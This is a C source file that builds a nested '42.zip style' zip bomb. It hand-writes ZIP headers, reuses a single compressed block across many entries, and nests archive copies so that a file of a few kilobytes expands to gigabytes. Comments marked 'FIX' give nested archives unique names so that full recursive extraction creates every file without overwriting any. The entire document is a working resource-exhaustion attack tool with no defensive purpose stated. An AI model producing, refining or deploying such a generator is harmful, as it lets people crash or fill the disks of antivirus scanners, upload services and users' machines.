// zipbomb.c - 42.zip style zip bomb generator (FIXED)
// Each level contains multiple copies of the next level with UNIQUE names
// Compile: gcc -O2 -Wall -o zipbomb zipbomb.c -lz
// Usage: ./zipbomb [depth] [expansion_mb] [copies_per_level]
// Example: ./zipbomb 3 10 4

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <zlib.h>
#include <sys/stat.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/time.h>
#endif
#include <stdint.h>

#define MAX_DEPTH 20
#define DEFAULT_COPIES 10
#define CHUNK_SIZE 8192

#pragma pack(push, 1)
typedef struct
{
    uint32_t signature;   // 0x04034b50
    uint16_t version;     // 20
    uint16_t flags;       // 0
    uint16_t compression; // 8 = deflate, 0 = store
    uint16_t mod_time;
    uint16_t mod_date;
    uint32_t crc32;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint16_t filename_len;
    uint16_t extra_len;
} LocalFileHeader;

typedef struct
{
    uint32_t signature; // 0x02014b50
    uint16_t version_made;
    uint16_t version_needed;
    uint16_t flags;
    uint16_t compression;
    uint16_t mod_time;
    uint16_t mod_date;
    uint32_t crc32;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint16_t filename_len;
    uint16_t extra_len;
    uint16_t comment_len;
    uint16_t disk_start;
    uint16_t internal_attr;
    uint32_t external_attr;
    uint32_t local_header_offset;
} CentralDirHeader;

typedef struct
{
    uint32_t signature; // 0x06054b50
    uint16_t disk_number;
    uint16_t start_disk;
    uint16_t entries_this_disk;
    uint16_t total_entries;
    uint32_t central_dir_size;
    uint32_t central_dir_offset;
    uint16_t comment_len;
} EndCentralDir;
#pragma pack(pop)

typedef struct
{
    char *filename;
    uint32_t offset;
    uint32_t crc32;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint16_t compression;
} FileEntry;

typedef struct
{
    int files_created;
    int zips_created;
    size_t total_compressed_kb;
    double total_uncompressed_gb;
#ifdef _WIN32
    LARGE_INTEGER start_time;
    LARGE_INTEGER frequency;
#else
    struct timeval start_time;
#endif
} Stats;

void init_stats(Stats *stats)
{
    memset(stats, 0, sizeof(*stats));
#ifdef _WIN32
    QueryPerformanceFrequency(&stats->frequency);
    QueryPerformanceCounter(&stats->start_time);
#else
    gettimeofday(&stats->start_time, NULL);
#endif
}

double get_elapsed_time(Stats *stats)
{
#ifdef _WIN32
    LARGE_INTEGER now;
    QueryPerformanceCounter(&now);
    return (double)(now.QuadPart - stats->start_time.QuadPart) / stats->frequency.QuadPart;
#else
    struct timeval now;
    gettimeofday(&now, NULL);
    return (now.tv_sec - stats->start_time.tv_sec) +
           (now.tv_usec - stats->start_time.tv_usec) / 1000000.0;
#endif
}

void get_dos_datetime(uint16_t *mod_time, uint16_t *mod_date)
{
    time_t now_t = time(NULL);
    struct tm *t = localtime(&now_t);
    *mod_time = (t->tm_hour << 11) | (t->tm_min << 5) | (t->tm_sec / 2);
    *mod_date = ((t->tm_year - 80) << 9) | ((t->tm_mon + 1) << 5) | t->tm_mday;
}

unsigned char *create_text_content(size_t size_mb)
{
    size_t size = size_mb * 1024 * 1024;
    unsigned char *data = malloc(size);

    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>?/~ \n";
    size_t charset_len = strlen(charset);

    // Create repeating patterns for better compression
    for (size_t i = 0; i < size; i++)
    {
        if (i % 80 == 79)
        {
            data[i] = '\n'; // Line breaks
        }
        else
        {
            // Repeating pattern that compresses well
            data[i] = charset[(i / 10) % charset_len];
        }
    }

    return data;
}

int compress_data_deflate(const unsigned char *input, size_t input_len,
                          unsigned char **output, size_t *output_len)
{
    z_stream stream;
    stream.zalloc = Z_NULL;
    stream.zfree = Z_NULL;
    stream.opaque = Z_NULL;

    if (deflateInit2(&stream, Z_BEST_COMPRESSION, Z_DEFLATED,
                     -MAX_WBITS, 8, Z_DEFAULT_STRATEGY) != Z_OK)
    {
        return 0;
    }

    size_t max_size = deflateBound(&stream, input_len);
    *output = malloc(max_size);

    stream.avail_in = input_len;
    stream.next_in = (unsigned char *)input;
    stream.avail_out = max_size;
    stream.next_out = *output;

    deflate(&stream, Z_FINISH);
    *output_len = stream.total_out;

    deflateEnd(&stream);
    return 1;
}

void write_file_entry(FILE *fp, FileEntry *entry, const unsigned char *data,
                      size_t data_size, uint16_t mod_time, uint16_t mod_date)
{
    entry->offset = ftell(fp);

    LocalFileHeader lfh = {0};
    lfh.signature = 0x04034b50;
    lfh.version = 20;
    lfh.flags = 0;
    lfh.compression = entry->compression;
    lfh.mod_time = mod_time;
    lfh.mod_date = mod_date;
    lfh.crc32 = entry->crc32;
    lfh.compressed_size = entry->compressed_size;
    lfh.uncompressed_size = entry->uncompressed_size;
    lfh.filename_len = strlen(entry->filename);
    lfh.extra_len = 0;

    fwrite(&lfh, sizeof(lfh), 1, fp);
    fwrite(entry->filename, 1, lfh.filename_len, fp);
    fwrite(data, 1, data_size, fp);
}

void write_central_directory(FILE *fp, FileEntry *entries, int count,
                             uint16_t mod_time, uint16_t mod_date)
{
    uint32_t central_start = ftell(fp);

    for (int i = 0; i < count; i++)
    {
        CentralDirHeader cdh = {0};
        cdh.signature = 0x02014b50;
        cdh.version_made = 0x031e;
        cdh.version_needed = 20;
        cdh.flags = 0;
        cdh.compression = entries[i].compression;
        cdh.mod_time = mod_time;
        cdh.mod_date = mod_date;
        cdh.crc32 = entries[i].crc32;
        cdh.compressed_size = entries[i].compressed_size;
        cdh.uncompressed_size = entries[i].uncompressed_size;
        cdh.filename_len = strlen(entries[i].filename);
        cdh.extra_len = 0;
        cdh.comment_len = 0;
        cdh.disk_start = 0;
        cdh.internal_attr = 0;
        cdh.external_attr = 0x81800000;
        cdh.local_header_offset = entries[i].offset;

        fwrite(&cdh, sizeof(cdh), 1, fp);
        fwrite(entries[i].filename, 1, cdh.filename_len, fp);
    }

    uint32_t central_end = ftell(fp);

    EndCentralDir eocd = {0};
    eocd.signature = 0x06054b50;
    eocd.disk_number = 0;
    eocd.start_disk = 0;
    eocd.entries_this_disk = count;
    eocd.total_entries = count;
    eocd.central_dir_size = central_end - central_start;
    eocd.central_dir_offset = central_start;
    eocd.comment_len = 0;

    fwrite(&eocd, sizeof(eocd), 1, fp);
}

// Create the innermost layer with actual data files
void create_data_layer(const char *output_name, size_t expand_mb, int num_files,
                       int layer_num, Stats *stats)
{
    FILE *fp = fopen(output_name, "wb");
    if (!fp)
    {
        perror("fopen");
        return;
    }

    printf("Creating data layer: %s (%d files × %luMB each)...\n",
           output_name, num_files, (unsigned long)expand_mb);

    uint16_t mod_time, mod_date;
    get_dos_datetime(&mod_time, &mod_date);

    // Create text content with varied characters
    size_t data_size = expand_mb * 1024 * 1024;
    unsigned char *uncompressed = create_text_content(expand_mb);
    uint32_t data_crc = crc32(0L, uncompressed, data_size);

    // Compress once, reuse many times
    unsigned char *compressed;
    size_t compressed_size;
    compress_data_deflate(uncompressed, data_size, &compressed, &compressed_size);

    FileEntry *entries = calloc(num_files, sizeof(FileEntry));

    // Write each file entry (reusing same compressed data)
    for (int i = 0; i < num_files; i++)
    {
        entries[i].filename = malloc(64);
        // Include layer number in filename for uniqueness
        snprintf(entries[i].filename, 64, "L%d_document%04d.txt", layer_num, i);
        entries[i].crc32 = data_crc;
        entries[i].compressed_size = compressed_size;
        entries[i].uncompressed_size = data_size;
        entries[i].compression = 8;

        write_file_entry(fp, &entries[i], compressed, compressed_size,
                         mod_time, mod_date);

        if ((i + 1) % 10 == 0 || i == num_files - 1)
        {
            printf("\r  Progress: %d/%d", i + 1, num_files);
            fflush(stdout);
        }
    }
    printf("\n");

    write_central_directory(fp, entries, num_files, mod_time, mod_date);

    for (int i = 0; i < num_files; i++)
    {
        free(entries[i].filename);
    }
    free(entries);
    free(uncompressed);
    free(compressed);
    fclose(fp);

    stats->files_created += num_files;
    stats->total_compressed_kb += (compressed_size * num_files) / 1024;
    stats->total_uncompressed_gb = (double)(expand_mb * num_files) / 1024.0;

    struct stat st;
    stat(output_name, &st);
    printf("  Created: %s (%.2f KB on disk, expands to %.2f MB)\n",
           output_name, st.st_size / 1024.0, (double)(expand_mb * num_files));
}

// Create a layer that contains multiple copies of the inner zip
// FIX: Add layer_num parameter to create unique filenames
void create_zip_layer(const char *output_name, const char *inner_zip,
                      int num_copies, int layer_num, Stats *stats)
{
    FILE *fp = fopen(output_name, "wb");
    if (!fp)
    {
        perror("fopen");
        return;
    }

    printf("Creating zip layer: %s (%d copies of %s)...\n",
           output_name, num_copies, inner_zip);

    uint16_t mod_time, mod_date;
    get_dos_datetime(&mod_time, &mod_date);

    // Read the inner zip file
    FILE *inner_fp = fopen(inner_zip, "rb");
    if (!inner_fp)
    {
        perror("fopen inner");
        fclose(fp);
        return;
    }

    fseek(inner_fp, 0, SEEK_END);
    size_t inner_size = ftell(inner_fp);
    fseek(inner_fp, 0, SEEK_SET);

    unsigned char *inner_data = malloc(inner_size);
    fread(inner_data, 1, inner_size, inner_fp);
    fclose(inner_fp);

    uint32_t inner_crc = crc32(0L, inner_data, inner_size);

    FileEntry *entries = calloc(num_copies, sizeof(FileEntry));

    // FIX: Include layer number in zip filenames to make them unique!
    // This prevents overwriting when extracting nested zips
    for (int i = 0; i < num_copies; i++)
    {
        entries[i].filename = malloc(64);
        snprintf(entries[i].filename, 64, "L%d_archive%04d.zip", layer_num + 1, i);
        entries[i].crc32 = inner_crc;
        entries[i].compressed_size = inner_size;
        entries[i].uncompressed_size = inner_size;
        entries[i].compression = 0; // stored (already compressed)

        write_file_entry(fp, &entries[i], inner_data, inner_size,
                         mod_time, mod_date);

        if ((i + 1) % 10 == 0 || i == num_copies - 1)
        {
            printf("\r  Progress: %d/%d", i + 1, num_copies);
            fflush(stdout);
        }
    }
    printf("\n");

    write_central_directory(fp, entries, num_copies, mod_time, mod_date);

    for (int i = 0; i < num_copies; i++)
    {
        free(entries[i].filename);
    }
    free(entries);
    free(inner_data);
    fclose(fp);

    stats->zips_created++;

    struct stat st;
    stat(output_name, &st);

    // Each copy contains the full expansion of the inner zip
    double current_expansion_gb = stats->total_uncompressed_gb * num_copies;

    printf("  Created: %s (%.2f KB on disk, expands to %.2f GB)\n",
           output_name, st.st_size / 1024.0, current_expansion_gb);

    // Update total expansion for next layer
    stats->total_uncompressed_gb = current_expansion_gb;
}

void create_42zip_bomb(int depth, size_t expand_mb, int copies_per_level, Stats *stats)
{
    char **zip_names = malloc((depth + 1) * sizeof(char *));

    // Create innermost layer with data files
    zip_names[depth] = malloc(64);
    snprintf(zip_names[depth], 64, "layer%d.zip", depth);

    printf("\n=== Layer %d/%d (Data Layer) ===\n", 1, depth + 1);
    create_data_layer(zip_names[depth], expand_mb, copies_per_level, depth, stats);

    // Create each successive layer containing multiple copies of previous
    for (int level = depth - 1; level >= 0; level--)
    {
        zip_names[level] = malloc(64);
        snprintf(zip_names[level], 64, "layer%d.zip", level);

        printf("\n=== Layer %d/%d ===\n", depth - level + 1, depth + 1);
        // FIX: Pass level number so inner zips get unique names
        create_zip_layer(zip_names[level], zip_names[level + 1],
                         copies_per_level, level, stats);

        // Clean up inner zip
        remove(zip_names[level + 1]);
    }

    printf("\n=== Final bomb: %s ===\n", zip_names[0]);

    for (int i = 0; i <= depth; i++)
    {
        free(zip_names[i]);
    }
    free(zip_names);
}

int main(int argc, char **argv)
{
    int depth = 3;
    size_t expand_mb = 10;
    int copies = DEFAULT_COPIES;

    if (argc >= 2)
    {
        depth = atoi(argv[1]);
        if (depth < 1 || depth > MAX_DEPTH)
        {
            fprintf(stderr, "Depth must be between 1 and %d\n", MAX_DEPTH);
            return 1;
        }
    }
    if (argc >= 3)
    {
        expand_mb = atoi(argv[2]);
    }
    if (argc >= 4)
    {
        copies = atoi(argv[3]);
        if (copies < 1 || copies > 100)
        {
            fprintf(stderr, "Copies per level must be between 1 and 100\n");
            return 1;
        }
    }

    Stats stats;
    init_stats(&stats);

    printf("╔════════════════════════════════════════════════╗\n");
    printf("║    42.zip Style Zip Bomb Generator (FIXED)    ║\n");
    printf("╚════════════════════════════════════════════════╝\n\n");
    printf("Configuration:\n");
    printf("  Depth: %d layers\n", depth + 1);
    printf("  Base file size: %lu MB\n", (unsigned long)expand_mb);
    printf("  Copies per layer: %d\n", copies);

    // Calculate theoretical expansion
    double theoretical = expand_mb * copies;
    for (int i = 1; i < depth; i++)
    {
        theoretical *= copies;
    }
    printf("  Theoretical expansion: %.2f GB\n", theoretical / 1024.0);
    printf("  Total files after full extraction: %d\n", (int)(copies * theoretical / expand_mb));
    printf("\n");

    create_42zip_bomb(depth, expand_mb, copies, &stats);

    double elapsed = get_elapsed_time(&stats);
    printf("\n╔════════════════════════════════════════════════╗\n");
    printf("║              Generation Complete!              ║\n");
    printf("╚════════════════════════════════════════════════╝\n\n");
    printf("Statistics:\n");
    printf("  Files created: %d\n", stats.files_created);
    printf("  Zip layers: %d\n", stats.zips_created + 1);
    printf("  Total compressed: %.2f KB\n", (double)stats.total_compressed_kb);
    printf("  Total expansion: %.2f GB\n", stats.total_uncompressed_gb);

    if (stats.total_compressed_kb > 0)
    {
        printf("  Actual compression ratio: %.0f:1\n",
               stats.total_uncompressed_gb * 1024 * 1024 / stats.total_compressed_kb);
    }
    printf("  Time elapsed: %.2f seconds\n", elapsed);

    struct stat st;
    if (stat("layer0.zip", &st) == 0)
    {
        printf("\n⚠️  WARNING: layer0.zip\n");
        printf("    File size: %.2f KB\n", st.st_size / 1024.0);
        printf("    Expands to: %.2f GB\n", stats.total_uncompressed_gb);
        printf("    Expansion: %.0fx\n",
               stats.total_uncompressed_gb * 1024 * 1024 / (st.st_size / 1024.0));
        printf("\n    ✅ FIXED: Now uses unique names (L0_archive0000.zip, etc.)\n");
        printf("    Each extracted zip will extract without overwriting!\n");
        printf("    Full recursive extraction will create %d text files.\n",
               (int)(copies * theoretical / expand_mb));
    }

    return 0;
}